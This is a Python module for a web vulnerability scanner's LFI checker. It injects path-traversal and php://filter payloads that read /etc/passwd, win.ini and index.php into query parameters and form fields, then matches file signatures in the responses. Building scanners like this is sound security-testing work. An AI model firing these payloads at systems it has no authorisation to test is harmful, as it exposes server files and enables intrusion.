import logging
import urllib.parse
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from scanner_engine.utils import format_http_request, format_http_response
import threading

logger = logging.getLogger(__name__)

class LfiScanner:
    def __init__(self, session, on_vuln=None):
        self.session = session
        self.on_vuln = on_vuln
        self.vulnerabilities = []
        self.scanned_fingerprints = set()
        self.lock = threading.Lock()
        self.payloads = [
            "../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "../../../../Windows/win.ini",
            "../../../../../../../../Windows/win.ini",
            "C:\\Windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php" 
        ]
        self.signatures = [
            "root:x:0:0",
            "daemon:x:",
            "[extensions]",
            "[fonts]",
            "Standard Jet DB" # common ODBC
        ]
        
    def scan_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
            
        base_url = url.split('?')[0]
        
        for param, values in params.items():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    res = self.session.get(base_url, params=test_params, timeout=10)
                    if self._check_vulnerability(res, param, payload, url):
                        break
                except:
                    pass

    def scan_form(self, form):
        action = form.get('action')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        base_data = {}
        for inp in inputs:
            if inp.get('name'):
                base_data[inp.get('name')] = inp.get('value', '')

        for inp in inputs:
            name = inp.get('name')
            if not name or inp.get('type') in ['submit', 'button']: continue
            
            for payload in self.payloads:
                data = base_data.copy()
                data[name] = payload
                try:
                    if method == 'POST':
                        res = self.session.post(action, data=data, timeout=10)
                    else:
                        res = self.session.get(action, params=data, timeout=10)
                    
                    if self._check_vulnerability(res, name, payload, action):
                        break
                except:
                    pass

    def _check_vulnerability(self, res, param, payload, endpoint):
        for sig in self.signatures:
            if sig in res.text:
                with self.lock:
                    fingerprint = f"{endpoint}:{param}"
                    if fingerprint in self.scanned_fingerprints:
                        return True
                    self.scanned_fingerprints.add(fingerprint)
                
                vuln = {
                    "name": "Local File Inclusion (LFI)",
                    "severity": "High",
                    "endpoint": endpoint,
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Found signature '{sig}' in response body.",
                    "request": format_http_request(res.request),
                    "response": format_http_response(res)
                }
                self.vulnerabilities.append(vuln)
                if self.on_vuln:
                    self.on_vuln(vuln)
                return True
        return False

    def get_results(self):
        return self.vulnerabilities
